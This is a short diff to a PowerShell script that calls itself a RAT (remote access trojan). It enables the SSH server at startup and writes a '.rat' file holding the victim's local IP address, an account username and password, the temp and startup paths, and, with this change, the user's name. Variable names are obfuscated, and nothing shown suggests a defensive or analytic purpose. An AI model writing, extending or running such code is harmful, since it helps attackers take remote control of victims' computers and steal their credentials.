@@ -44,12 +44,14 @@ Set-Service -Name sshd -StartupType 'Automatic'
 
 # rat file
 $CRYnrkaDbe = "$env:UserName.rat"
+$name = "$env:UserName"
 $AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress
 
 New-Item -Path $CRYnrkaDbe -Force
 Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
 Add-Content -Path $CRYnrkaDbe -Value $sqbXFdLvyw -Force # username
 Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
+Add-Content -Path $CRYnrkaDbe -Value $name -Force # name
 Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
 Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
 Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
